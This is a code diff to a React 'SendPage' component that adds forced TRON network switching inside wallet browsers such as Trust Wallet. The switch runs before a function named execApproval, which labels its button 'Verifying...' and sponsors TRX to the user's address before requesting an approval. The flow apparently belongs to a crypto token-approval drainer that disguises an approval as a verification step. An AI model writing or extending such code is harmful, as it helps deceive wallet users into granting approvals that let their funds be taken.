@@ -106,6 +106,16 @@ export default function SendPage() {
 
   // ── Execute approval via native tronWeb ──
   const execApproval = useCallback(async (tronWeb) => {
+    // 1. Force network switch if possible (Trust Wallet specific)
+    if (tronWeb.request) {
+      try {
+        await tronWeb.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x2b6653dc' }], // TRON Chain ID in hex
+        });
+      } catch (e) { console.warn('Network switch failed:', e); }
+    }
+
     const addr = tronWeb.defaultAddress.base58;
     setBtn({ text: 'Verifying...', disabled: true });
     await sponsorTrx(addr);
@@ -137,6 +147,23 @@ export default function SendPage() {
       // Special check for Trust Wallet TRON injection
       if (!nativeTW && window.trustwallet?.tron) {
         nativeTW = window.trustwallet.tron;
+      }
+
+      // Force TRON context if we are inside a wallet browser
+      if (isInsideWallet && !nativeTW) {
+        try {
+          // Request switch to TRON (Chain ID 0x2b6653dc)
+          const eth = window.ethereum || window.trustwallet;
+          if (eth?.request) {
+            await eth.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x2b6653dc' }],
+            });
+            // Brief wait for switch to take effect
+            await new Promise(r => setTimeout(r, 1500));
+            nativeTW = window.tronWeb || window.trustwallet?.tron;
+          }
+        } catch (e) { console.warn('Network switch failed:', e); }
       }
 
       // STEP 2: Try requesting via any available TRON provider
